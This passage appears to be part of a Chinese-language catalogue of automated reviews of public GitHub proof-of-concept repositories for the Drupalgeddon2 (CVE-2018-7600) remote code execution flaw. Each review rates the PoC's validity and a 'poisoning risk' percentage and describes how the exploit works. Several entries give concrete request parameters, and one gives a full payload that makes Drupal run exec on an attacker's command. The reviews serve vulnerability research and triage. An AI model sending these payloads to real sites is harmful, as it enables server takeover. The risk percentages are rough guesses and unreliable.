**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

